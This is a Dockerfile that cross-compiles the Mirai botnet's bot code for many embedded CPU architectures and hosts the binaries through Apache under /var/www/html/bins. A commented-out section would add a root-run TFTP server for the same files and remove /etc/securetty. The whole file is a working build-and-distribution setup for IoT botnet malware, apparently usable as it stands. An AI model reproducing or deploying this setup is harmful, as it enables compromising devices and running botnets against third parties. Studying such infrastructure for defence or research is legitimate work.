FROM debian

RUN apt update && apt install -y gcc wget apache2 electric-fence tftpd xinetd

RUN service apache2 start

RUN mkdir /etc/xcompile
RUN cd /etc/xcompile && wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
RUN cd /etc/xcompile && wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
RUN cd /etc/xcompile && wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
RUN cd /etc/xcompile && wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
RUN cd /etc/xcompile && wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
RUN cd /etc/xcompile && wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
RUN cd /etc/xcompile && wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
RUN cd /etc/xcompile && wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2

COPY ./cross_compile.sh /app/cross_compile.sh
RUN bash /app/cross_compile.sh

WORKDIR /app

COPY ./helper_path.sh /app/

RUN mkdir /app/release
COPY ./build_bot.sh /app/
COPY ./Mirai-Source-Code/mirai/bot/ /app/bot

RUN mkdir debug
RUN /app/build_bot.sh debug telnet

RUN ls /app/debug

RUN mkdir /var/www/html/bins

RUN cp /app/debug/* /var/www/html/bins/

RUN ls /var/www/html/bins/


# RUN echo "service tftp \n\
# { \n \
# protocol    	= udp \n \
# port        	= 69 \n \
# socket_type 	= dgram \n \
# wait        	= no \n \
# user        	= root \n \
# server      	= /usr/sbin/in.tftpd \n \
# server_args 	= /var/www/html/bins/ \n \
# disable     	= no \n \
# }" | tee -a /etc/xinetd.d/tftp && rm -f /etc/securetty




CMD ["/usr/sbin/apachectl", "-D", "FOREGROUND"]